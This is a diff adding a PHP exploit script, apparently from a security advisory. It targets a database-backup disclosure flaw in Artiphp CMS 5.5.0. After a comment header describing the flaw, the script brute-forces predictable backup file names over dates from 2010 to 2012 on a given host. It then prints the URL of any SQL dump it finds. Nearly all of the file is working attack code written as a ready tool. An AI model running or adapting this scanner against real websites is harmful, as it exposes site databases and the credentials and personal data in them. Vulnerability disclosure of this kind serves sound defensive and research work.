@@ -1,0 +1,103 @@
+<?php
+
+/*
+
+Artiphp CMS 5.5.0 Database Backup Disclosure Exploit
+
+
+Vendor: Artiphp
+Product web page: http://www.artiphp.com
+Affected version: 5.5.0 Neo (r422)
+
+Summary: Artiphp is a content management system (CMS) open
+and free to create and manage your website.
+
+Desc: Artiphp stores database backups using backupDB() utility
+with a predictable file name inside the web root, which can be
+exploited to disclose sensitive information by downloading the
+file. The backup is located in '/artzone/artpublic/database/'
+directory as 'db_backup_[type].[yyyy-mm-dd].sql.gz' filename.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.21
+           PHP 5.3.8 / 5.3.9
+           MySQL 5.5.20
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2012-5091
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5091.php
+
+
+15.05.2012
+
+*/
+
+error_reporting(0);
+
+print "\no==========================================================o\n";
+print "|                                                          |";
+print "\n|\tArtiphp CMS 5.5.0 DB Backup Disclosure Exploit     |\n";
+print "|                                                          |\n";
+print "|\t\t\tby LiquidWorm                      |\n";
+print "|                                                          |";
+print "\no==========================================================o\n";
+
+if ($argc < 3)
+{
+    print "\n\n\x20[*] Usage: php $argv[0] <host> <port>\n\n\n";
+    die();
+}
+
+$godina_array = array('2012','2011','2010');
+
+$mesec_array = array('12','11','10','09',
+		     '08','07','06','05',
+		     '04','03','02','01');
+
+$dn_array = array('31','30','29','28','27','26',
+		  '25','24','23','22','21','20',
+		  '19','18','17','16','15','14',
+		  '13','12','11','10','09','08',
+		  '07','06','05','04','03','02',
+		  '01');
+
+$backup_array = array('full','structure','partial');
+
+$host = $argv[1];
+$port = intval($argv[2]);
+$path = "/artiphp/artzone/artpublic/database/"; // change per need.
+
+$alert1 = "\033[0;31m";
+$alert2 = "\033[0;37m";
+
+foreach($godina_array as $godina)
+{
+	print "\n\n\x20[*] Checking year: ".$godina."\n\n Scanning: ";
+	sleep(2);
+	foreach($mesec_array as $mesec)
+	{
+		foreach($dn_array as $dn)
+		{
+			print "~";
+			foreach($backup_array as $backup)
+			{
+				if(file_get_contents("http://".$host.":".$port.$path."db_backup_".$backup.".".$godina."-".$mesec."-".$dn.".sql.gz"))
+				{
+					print "\n\n\x20[!] DB backup file discovered!\n\n";
+					echo $alert1;
+					print "\x20==>\x20";
+					echo $alert2;
+					die("http://".$host.":".$port.$path."db_backup_".$backup.".".$godina."-".$mesec."-".$dn.".sql.gz\n");
+				}
+			}
+		}
+	}
+}
+
+print "\n\n\x20[*] Zero findings.\n\n\n"
+
+?>
